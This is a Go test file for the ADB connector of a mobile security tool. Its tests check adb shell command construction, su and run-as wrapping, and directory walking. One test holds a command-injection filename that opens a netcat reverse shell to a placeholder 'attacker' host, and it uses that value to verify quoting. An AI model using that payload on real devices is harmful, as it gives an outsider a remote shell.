package transport

import (
	"context"
	"io/fs"
	"reflect"
	"strings"
	"testing"

	"github.com/integrisec/MobFI/internal/device"
)

func TestADBConnectorSupports(t *testing.T) {
	c := NewADBConnector()
	if !c.Supports(device.Device{Platform: device.Android}) {
		t.Error("should support Android")
	}
	if c.Supports(device.Device{Platform: device.IOS}) {
		t.Error("should not support iOS")
	}
}

func TestADBExecBuildsShellCommand(t *testing.T) {
	var got []string
	a := &adbConn{bin: "adb", serial: "SER", run: func(_ context.Context, name string, args ...string) ([]byte, error) {
		got = append([]string{name}, args...)
		return []byte("uid=0"), nil
	}}
	out, err := a.Exec(context.Background(), "id", "-u")
	if err != nil {
		t.Fatal(err)
	}
	if string(out) != "uid=0" {
		t.Errorf("out = %q", out)
	}
	want := []string{"adb", "-s", "SER", "shell", "'id' '-u'"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("args = %v, want %v", got, want)
	}
}

func TestADBRunAsWrapsCommands(t *testing.T) {
	var got []string
	a := &adbConn{bin: "adb", serial: "SER", asPackage: "com.x", run: func(_ context.Context, name string, args ...string) ([]byte, error) {
		got = append([]string{name}, args...)
		return nil, nil
	}}
	a.Exec(context.Background(), "id", "-u")
	want := []string{"adb", "-s", "SER", "shell", "'run-as' 'com.x' 'id' '-u'"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("run-as Exec args = %v, want %v", got, want)
	}

	a.find(context.Background(), "/data/data/com.x", "-type", "d")
	wantFind := []string{"adb", "-s", "SER", "shell", "'run-as' 'com.x' 'find' '/data/data/com.x' '-type' 'd'"}
	if !reflect.DeepEqual(got, wantFind) {
		t.Errorf("run-as find args = %v, want %v", got, wantFind)
	}
}

// In su mode the on-device command runs as `su 0 <argv>` (not `su -c
// 'joined'`) so su exec's the argv directly rather than shelling it a second
// time; the whole string is single-quoted for the outer adb-shell so no
// metacharacter in a device-supplied element executes on the way in. See
// SECURITY-AUDIT.md finding MFI-CMD-01.
func TestADBSuWrapsCommands(t *testing.T) {
	var got []string
	a := &adbConn{bin: "adb", serial: "SER", su: true, run: func(_ context.Context, name string, args ...string) ([]byte, error) {
		got = append([]string{name}, args...)
		return nil, nil
	}}
	a.Exec(context.Background(), "ls", "/data/data/com.x")
	want := []string{"adb", "-s", "SER", "shell", "'su' '0' 'ls' '/data/data/com.x'"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("su Exec args = %v, want %v", got, want)
	}

	a.find(context.Background(), "/data/data/com.x", "-type", "d")
	wantFind := []string{"adb", "-s", "SER", "shell", "'su' '0' 'find' '/data/data/com.x' '-type' 'd'"}
	if !reflect.DeepEqual(got, wantFind) {
		t.Errorf("su find args = %v, want %v", got, wantFind)
	}
}

// TestADBQuotesShellMetacharsInFilenames confirms that device-side names
// carrying shell metacharacters ride through wrap() as literal argv data and
// never surface as extra sh tokens. Guards MFI-CMD-01 and MFI-CMD-02.
func TestADBQuotesShellMetacharsInFilenames(t *testing.T) {
	// A filename crafted by a hostile app that would inject if any layer
	// interpreted it as sh.
	hostile := "/sdcard/foo; busybox nc attacker 443 -e /system/bin/sh #"

	for _, mode := range []struct {
		name string
		a    *adbConn
	}{
		{"non-su", &adbConn{bin: "adb", serial: "SER"}},
		{"run-as", &adbConn{bin: "adb", serial: "SER", asPackage: "com.x"}},
		{"su", &adbConn{bin: "adb", serial: "SER", su: true}},
	} {
		got := mode.a.wrap("exec-out", "cat", hostile)
		if len(got) < 4 {
			t.Fatalf("%s: expected wrap to emit >=4 argv elements, got %v", mode.name, got)
		}
		last := got[len(got)-1]
		// The command line handed to the outer adb-shell must be one string,
		// with the hostile path fully enclosed in a single-quoted token, so
		// the device sh sees `cat` + one argument, not two chained commands.
		if !strings.Contains(last, "'"+hostile+"'") {
			t.Errorf("%s: hostile path was not single-quoted for the device shell.\nargv[last] = %q", mode.name, last)
		}
		// And the metacharacters must not appear unquoted anywhere else --
		// if wrap ever split them out of the quoted token they would be
		// here.
		for _, tok := range got[:len(got)-1] {
			if strings.ContainsAny(tok, ";|`$") {
				t.Errorf("%s: shell metachar leaked into argv element %q", mode.name, tok)
			}
		}
	}
}

// TestQuoteArgvPanicsOnNUL guards the input contract of quoteArgv against
// silent truncation by exec.
func TestQuoteArgvPanicsOnNUL(t *testing.T) {
	defer func() {
		if r := recover(); r == nil {
			t.Fatal("expected panic on NUL byte in argv")
		}
	}()
	quoteArgv([]string{"cat", "/tmp/foo\x00/bar"})
}

const (
	walkAll = `/data/data/com.x
/data/data/com.x/files
/data/data/com.x/files/a.txt
/data/data/com.x/cache
/data/data/com.x/cache/c.bin
/data/data/com.x/shared_prefs
/data/data/com.x/shared_prefs/p.xml
`
	walkDirs = `/data/data/com.x
/data/data/com.x/files
/data/data/com.x/cache
/data/data/com.x/shared_prefs
`
	walkFiles = `/data/data/com.x/files/a.txt
/data/data/com.x/cache/c.bin
/data/data/com.x/shared_prefs/p.xml
`
)

func walkConn() *adbConn {
	return &adbConn{bin: "adb", serial: "SER", run: func(_ context.Context, _ string, args ...string) ([]byte, error) {
		// wrap() emits the whole on-device command as one shell-quoted
		// string in the final argv element, so the -type flag is embedded
		// there rather than a separate positional arg.
		last := args[len(args)-1]
		switch {
		case strings.Contains(last, "'-type' 'd'"):
			return []byte(walkDirs), nil
		case strings.Contains(last, "'-type' 'f'"):
			return []byte(walkFiles), nil
		default:
			return []byte(walkAll), nil
		}
	}}
}

func TestADBWalkVisitsAll(t *testing.T) {
	var visited []string
	dirs := map[string]bool{}
	err := walkConn().Walk(context.Background(), "/data/data/com.x", func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		visited = append(visited, p)
		dirs[p] = d.IsDir()
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(visited) != 7 {
		t.Fatalf("visited %d entries, want 7: %v", len(visited), visited)
	}
	if !dirs["/data/data/com.x/cache"] || dirs["/data/data/com.x/cache/c.bin"] {
		t.Errorf("directory classification wrong: %v", dirs)
	}
}

func TestADBWalkSkipDir(t *testing.T) {
	var visited []string
	err := walkConn().Walk(context.Background(), "/data/data/com.x", func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		visited = append(visited, p)
		if p == "/data/data/com.x/cache" {
			return fs.SkipDir
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range visited {
		if p == "/data/data/com.x/cache/c.bin" {
			t.Fatalf("SkipDir did not skip cache contents: %v", visited)
		}
	}
	if len(visited) != 6 {
		t.Fatalf("visited %d entries, want 6: %v", len(visited), visited)
	}
}
